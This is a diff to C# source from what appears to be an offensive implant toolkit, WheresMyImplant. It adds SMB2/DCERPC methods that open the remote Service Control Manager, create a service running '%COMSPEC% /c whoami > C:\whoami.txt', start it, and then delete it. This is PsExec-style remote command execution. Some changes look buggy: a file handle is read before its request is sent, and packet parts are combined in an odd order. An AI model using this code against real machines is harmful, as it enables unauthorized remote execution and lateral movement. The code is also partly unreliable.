@@ -27,6 +27,7 @@ namespace WheresMyImplant
         NetworkStream streamSocket;
 
         Byte[] guidFileHandle = new Byte[16];
+        Byte[] serviceHandle = new Byte[0];
 
         Byte[] recieve = new Byte[81920];
 
@@ -350,20 +351,7 @@ namespace WheresMyImplant
             }
             Byte[] bHeader = header.GetHeader();
 
-            NetBIOSSessionService sessionService = new NetBIOSSessionService();
-            sessionService.SetHeaderLength(bHeader.Length);
-            sessionService.SetDataLength(bData.Length);
-            Byte[] bSessionService = sessionService.GetNetBIOSSessionService();
-
-            Byte[] bSend = Misc.Combine(Misc.Combine(bSessionService, bHeader), bData);
-            streamSocket.Write(bSend, 0, bSend.Length);
-            streamSocket.Flush();
-            streamSocket.Read(recieve, 0, recieve.Length);
-
-            if (GetStatus(recieve.Skip(12).Take(4).ToArray()))
-                return true;
-            else
-                return false;
+            return Send(bHeader, bData);
         }
 
         internal Boolean CreateRequest()
@@ -390,25 +378,8 @@ namespace WheresMyImplant
             }
             Byte[] bHeader = header.GetHeader();
 
-            NetBIOSSessionService sessionService = new NetBIOSSessionService();
-            sessionService.SetHeaderLength(bHeader.Length);
-            sessionService.SetDataLength(bData.Length);
-            Byte[] bSessionService = sessionService.GetNetBIOSSessionService();
-
-            Byte[] bSend = Misc.Combine(Misc.Combine(bSessionService, bHeader), bData);
-            streamSocket.Write(bSend, 0, bSend.Length);
-            streamSocket.Flush();
-            streamSocket.Read(recieve, 0, recieve.Length);
-
-            if (GetStatus(recieve.Skip(12).Take(4).ToArray()))
-            {
-                guidFileHandle = recieve.Skip(0x0084).Take(16).ToArray();
-                return true;
-            }
-            else
-            {
-                return false;
-            }
+            guidFileHandle = recieve.Skip(0x0084).Take(16).ToArray();
+            return Send(bHeader, bData);
         }
 
         internal Boolean RPCBind()
@@ -430,7 +401,7 @@ namespace WheresMyImplant
             Byte[] bData = bind.GetRequest();
 
             SMB2WriteRequest writeRequest = new SMB2WriteRequest();
-            writeRequest.SetFileID(guidFileHandle);
+            writeRequest.SetGuidHandleFile(guidFileHandle);
             writeRequest.SetLength(bData.Length);
             bData = Misc.Combine(writeRequest.GetRequest(), bData);
 
@@ -441,20 +412,7 @@ namespace WheresMyImplant
             }
             Byte[] bHeader = header.GetHeader();
 
-            NetBIOSSessionService sessionService = new NetBIOSSessionService();
-            sessionService.SetHeaderLength(bHeader.Length);
-            sessionService.SetDataLength(bData.Length);
-            Byte[] bSessionService = sessionService.GetNetBIOSSessionService();
-
-            Byte[] bSend = Misc.Combine(Misc.Combine(bSessionService, bHeader), bData);
-            streamSocket.Write(bSend, 0, bSend.Length);
-            streamSocket.Flush();
-            streamSocket.Read(recieve, 0, recieve.Length);
-
-            if (GetStatus(recieve.Skip(12).Take(4).ToArray()))
-                return true;
-            else
-                return false;
+            return Send(bHeader, bData);
         }
 
         internal Boolean ReadRequest()
@@ -469,6 +427,7 @@ namespace WheresMyImplant
 
             SMB2ReadRequest readRequest = new SMB2ReadRequest();
             readRequest.SetGuidHandleFile(guidFileHandle);
+            readRequest.SetLength(new Byte[] { 0xff, 0x00, 0x00, 0x00 });
             Byte[] bData = readRequest.GetRequest();
 
             if (signing)
@@ -478,20 +437,7 @@ namespace WheresMyImplant
             }
             Byte[] bHeader = header.GetHeader();
 
-            NetBIOSSessionService sessionService = new NetBIOSSessionService();
-            sessionService.SetHeaderLength(bHeader.Length);
-            sessionService.SetDataLength(bData.Length);
-            Byte[] bSessionService = sessionService.GetNetBIOSSessionService();
-
-            Byte[] bSend = Misc.Combine(Misc.Combine(bSessionService, bHeader), bData);
-            streamSocket.Write(bSend, 0, bSend.Length);
-            streamSocket.Flush();
-            streamSocket.Read(recieve, 0, recieve.Length);
-
-            if (GetStatus(recieve.Skip(12).Take(4).ToArray()))
-                return true;
-            else
-                return false;
+            return Send(bHeader, bData);
         }
 
         internal Boolean OpenSCManagerW()
@@ -546,20 +492,57 @@ namespace WheresMyImplant
                 return false;
         }
 
-        internal Boolean ReadRequest()
+        internal Boolean CheckAccess()
+        {
+            Byte[] handle = recieve.Skip(107).Take(19).ToArray();
+            Byte[] status = recieve.Skip(127).Take(4).ToArray();
+
+            if (!status.SequenceEqual(new Byte[] { 0x00, 0x00, 0x00, 0x00 }) 
+                && handle.SequenceEqual(new Byte[] { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 }))
+            {
+                return false;
+            }
+
+            SVCCTLSCMCreateServiceW createServiceW = new SVCCTLSCMCreateServiceW();
+            createServiceW.SetContextHandle(handle);
+            createServiceW.SetServiceName();
+            createServiceW.SetCommand(@"%COMSPEC% /c whoami > C:\whoami.txt");
+            Byte[] bData = createServiceW.GetRequest();
+
+            if (bData.Length < 4256)
+                return CreateServiceW(bData);
+            else
+                return CreateServiceW1();
+        }
+
+        internal Boolean CreateServiceW(Byte[] bCreateServiceW)
         {
             SMB2Header header = new SMB2Header();
-            header.SetCommand(new Byte[] { 0x08, 0x00 });
+            header.SetCommand(new Byte[] { 0x09, 0x00 });
             header.SetCreditsRequested(new Byte[] { 0x01, 0x00 });
             header.SetMessageID(++messageId);
             header.SetProcessID(processId);
             header.SetTreeId(treeId);
             header.SetSessionID(sessionId);
 
-            SMB2ReadRequest readRequest = new SMB2ReadRequest();
-            readRequest.SetGuidHandleFile(guidFileHandle);
-            readRequest.SetLength(new Byte[] { 0xff, 0x00, 0x00, 0x00 });
-            Byte[] bData = readRequest.GetRequest();
+            DCERPCRequest rpcRequest = new DCERPCRequest();
+            rpcRequest.SetPacketFlags(new Byte[] { 0x03 });
+            rpcRequest.SetFragLength(bCreateServiceW.Length, 0, 0);
+            rpcRequest.SetCallID(new Byte[] { 0x01, 0x00, 0x00, 0x00 });
+            rpcRequest.SetContextID(new Byte[] { 0x00, 0x00 });
+            rpcRequest.SetOpnum(new Byte[] { 0x0c, 0x00 });
+            Byte[] bRPCData = rpcRequest.GetRequest();
+
+            SMB2WriteRequest writeRequest = new SMB2WriteRequest();
+            writeRequest.SetGuidHandleFile(guidFileHandle);
+            writeRequest.SetLength(bRPCData.Length + bCreateServiceW.Length);
+            Byte[] bWriteRequest = writeRequest.GetRequest();
+
+            Combine combine = new Combine();
+            combine.Extend(bWriteRequest);
+            combine.Extend(bCreateServiceW);
+            combine.Extend(bRPCData);
+            Byte[] bData = combine.Retrieve();
 
             if (signing)
             {
@@ -568,6 +551,238 @@ namespace WheresMyImplant
             }
             Byte[] bHeader = header.GetHeader();
 
+            return Send(bHeader, bData);
+        }
+
+        internal Boolean CreateServiceW1()
+        {
+            return false;
+        }
+
+        internal Boolean StartServiceW()
+        {
+            serviceHandle = recieve.Skip(112).Take(19).ToArray();
+
+            SMB2Header header = new SMB2Header();
+            header.SetCommand(new Byte[] { 0x09, 0x00 });
+            header.SetCreditsRequested(new Byte[] { 0x01, 0x00 });
+            header.SetMessageID(++messageId);
+            header.SetProcessID(processId);
+            header.SetTreeId(treeId);
+            header.SetSessionID(sessionId);
+
+            SVCCTLSCMStartServiceW startServiceW = new SVCCTLSCMStartServiceW();
+            startServiceW.SetContextHandle(serviceHandle);
+            Byte[] bStartService = startServiceW.GetRequest();
+
+            DCERPCRequest rpcRequest = new DCERPCRequest();
+            rpcRequest.SetPacketFlags(new Byte[] { 0x03 });
+            rpcRequest.SetFragLength(bStartService.Length, 0, 0);
+            rpcRequest.SetCallID(new Byte[] { 0x01, 0x00, 0x00, 0x00 });
+            rpcRequest.SetContextID(new Byte[] { 0x00, 0x00 });
+            rpcRequest.SetOpnum(new Byte[] { 0x13, 0x00 });
+            Byte[] bRPCRequest = rpcRequest.GetRequest();
+
+            SMB2WriteRequest writeRequest = new SMB2WriteRequest();
+            writeRequest.SetGuidHandleFile(guidFileHandle);
+            writeRequest.SetLength(bRPCRequest.Length + bStartService.Length);
+            Byte[] bWriteRequest = writeRequest.GetRequest();
+
+            Combine combine = new Combine();
+            combine.Extend(bWriteRequest);
+            combine.Extend(bRPCRequest);
+            combine.Extend(bStartService);
+            Byte[] bData = combine.Retrieve();
+
+            if (signing)
+            {
+                header.SetFlags(new Byte[] { 0x08, 0x00, 0x00, 0x00 });
+                header.SetSignature(sessionKey, ref bData);
+            }
+            Byte[] bHeader = header.GetHeader();
+
+            return Send(bHeader, bData);
+        }
+
+        internal Boolean DeleteServiceW()
+        {
+            SMB2Header header = new SMB2Header();
+            header.SetCommand(new Byte[] { 0x09, 0x00 });
+            header.SetCreditsRequested(new Byte[] { 0x01, 0x00 });
+            header.SetMessageID(++messageId);
+            header.SetProcessID(processId);
+            header.SetTreeId(treeId);
+            header.SetSessionID(sessionId);
+
+            SVCCTLSCMDeleteServiceW deleteServiceW = new SVCCTLSCMDeleteServiceW();
+            deleteServiceW.SetContextHandle(serviceHandle);
+            Byte[] bDeleteServiceW = deleteServiceW.GetRequest();
+
+            DCERPCRequest rpcRequest = new DCERPCRequest();
+            rpcRequest.SetPacketFlags(new Byte[] { 0x03 });
+            rpcRequest.SetFragLength(bDeleteServiceW.Length, 0, 0);
+            rpcRequest.SetCallID(new Byte[] { 0x01, 0x00, 0x00, 0x00 });
+            rpcRequest.SetContextID(new Byte[] { 0x00, 0x00 });
+            rpcRequest.SetOpnum(new Byte[] { 0x02, 0x00 });
+            Byte[] bRPCRequest = rpcRequest.GetRequest();
+
+            SMB2WriteRequest writeRequest = new SMB2WriteRequest();
+            writeRequest.SetGuidHandleFile(guidFileHandle);
+            writeRequest.SetLength(bRPCRequest.Length + bDeleteServiceW.Length);
+            Byte[] bWriteRequest = writeRequest.GetRequest();
+
+            Combine combine = new Combine();
+            combine.Extend(bWriteRequest);
+            combine.Extend(bRPCRequest);
+            combine.Extend(bDeleteServiceW);
+            Byte[] bData = combine.Retrieve();
+
+            if (signing)
+            {
+                header.SetFlags(new Byte[] { 0x08, 0x00, 0x00, 0x00 });
+                header.SetSignature(sessionKey, ref bData);
+            }
+            Byte[] bHeader = header.GetHeader();
+
+            return Send(bHeader, bData);
+        }
+
+        internal Boolean CloseServiceHandle()
+        {
+            SMB2Header header = new SMB2Header();
+            header.SetCommand(new Byte[] { 0x09, 0x00 });
+            header.SetCreditsRequested(new Byte[] { 0x01, 0x00 });
+            header.SetMessageID(++messageId);
+            header.SetProcessID(processId);
+            header.SetTreeId(treeId);
+            header.SetSessionID(sessionId);
+
+            SVCCTLSCMCloseServiceHandle closeServiceW = new SVCCTLSCMCloseServiceHandle();
+            closeServiceW.SetContextHandle(serviceHandle);
+            Byte[] bCloseServiceW = closeServiceW.GetRequest();
+
+            DCERPCRequest rpcRequest = new DCERPCRequest();
+            rpcRequest.SetPacketFlags(new Byte[] { 0x03 });
+            rpcRequest.SetFragLength(bCloseServiceW.Length, 0, 0);
+            rpcRequest.SetCallID(new Byte[] { 0x01, 0x00, 0x00, 0x00 });
+            rpcRequest.SetContextID(new Byte[] { 0x00, 0x00 });
+            rpcRequest.SetOpnum(new Byte[] { 0x00, 0x00 });
+            Byte[] bRPCRequest = rpcRequest.GetRequest();
+
+            SMB2WriteRequest writeRequest = new SMB2WriteRequest();
+            writeRequest.SetGuidHandleFile(guidFileHandle);
+            writeRequest.SetLength(bRPCRequest.Length + bCloseServiceW.Length);
+            Byte[] bWriteRequest = writeRequest.GetRequest();
+
+            Combine combine = new Combine();
+            combine.Extend(bWriteRequest);
+            combine.Extend(bRPCRequest);
+            combine.Extend(bCloseServiceW);
+            Byte[] bData = combine.Retrieve();
+
+            if (signing)
+            {
+                header.SetFlags(new Byte[] { 0x08, 0x00, 0x00, 0x00 });
+                header.SetSignature(sessionKey, ref bData);
+            }
+            Byte[] bHeader = header.GetHeader();
+
+            return Send(bHeader, bData);
+        }
+
+        ////////////////////////////////////////////////////////////////////////////////
+        //
+        ////////////////////////////////////////////////////////////////////////////////
+        internal Boolean CloseRequest()
+        {
+            SMB2Header header = new SMB2Header();
+            header.SetCommand(new Byte[] { 0x06, 0x00 });
+            header.SetCreditsRequested(new Byte[] { 0x01, 0x00 });
+            header.SetMessageID(++messageId);
+            header.SetProcessID(processId);
+            header.SetTreeId(treeId);
+            header.SetSessionID(sessionId);
+
+            SMB2CloseRequest closeRequest = new SMB2CloseRequest();
+            closeRequest.SetFileID(guidFileHandle);
+            Byte[] bData = closeRequest.GetRequest();
+
+            if (signing)
+            {
+                header.SetFlags(new Byte[] { 0x08, 0x00, 0x00, 0x00 });
+                header.SetSignature(sessionKey, ref bData);
+            }
+            else
+            {
+                header.SetFlags(new Byte[] { 0x00, 0x00, 0x00, 0x00 });
+            }
+            Byte[] bHeader = header.GetHeader();
+
+            return Send(bHeader, bData);
+        }
+
+        ////////////////////////////////////////////////////////////////////////////////
+        //
+        ////////////////////////////////////////////////////////////////////////////////
+        internal Boolean DisconnectTree()
+        {
+            SMB2Header header = new SMB2Header();
+            header.SetCommand(new Byte[] { 0x04, 0x00 });
+            header.SetCreditsRequested(new Byte[] { 0x01, 0x00 });
+            header.SetMessageID(++messageId);
+            header.SetProcessID(processId);
+            header.SetTreeId(treeId);
+            header.SetSessionID(sessionId);
+
+            SMB2TreeDisconnectRequest disconnectRequest = new SMB2TreeDisconnectRequest();
+            Byte[] bData = disconnectRequest.GetRequest();
+
+            if (signing)
+            {
+                header.SetFlags(new Byte[] { 0x08, 0x00, 0x00, 0x00 });
+                header.SetSignature(sessionKey, ref bData);
+            }
+            else
+            {
+                header.SetFlags(new Byte[] { 0x00, 0x00, 0x00, 0x00 });
+            }
+            Byte[] bHeader = header.GetHeader();
+
+            return Send(bHeader, bData);
+        }
+
+        ////////////////////////////////////////////////////////////////////////////////
+        //
+        ////////////////////////////////////////////////////////////////////////////////
+        internal Boolean Logoff()
+        {
+            SMB2Header header = new SMB2Header();
+            header.SetCommand(new Byte[] { 0x02, 0x00 });
+            header.SetCreditsRequested(new Byte[] { 0x01, 0x00 });
+            header.SetMessageID(++messageId);
+            header.SetProcessID(processId);
+            header.SetTreeId(treeId);
+            header.SetSessionID(sessionId);
+
+            SMB2SessionLogoffRequest logoffRequest = new SMB2SessionLogoffRequest();
+            Byte[] bData = logoffRequest.GetRequest();
+
+            if (signing)
+            {
+                header.SetFlags(new Byte[] { 0x08, 0x00, 0x00, 0x00 });
+                header.SetSignature(sessionKey, ref bData);
+            }
+
+            Byte[] bHeader = header.GetHeader();
+
+            return Send(bHeader, bData);
+        }
+
+        ////////////////////////////////////////////////////////////////////////////////
+        //
+        ////////////////////////////////////////////////////////////////////////////////
+        private Boolean Send(Byte[] bHeader, Byte[] bData)
+        {
             NetBIOSSessionService sessionService = new NetBIOSSessionService();
             sessionService.SetHeaderLength(bHeader.Length);
             sessionService.SetDataLength(bData.Length);
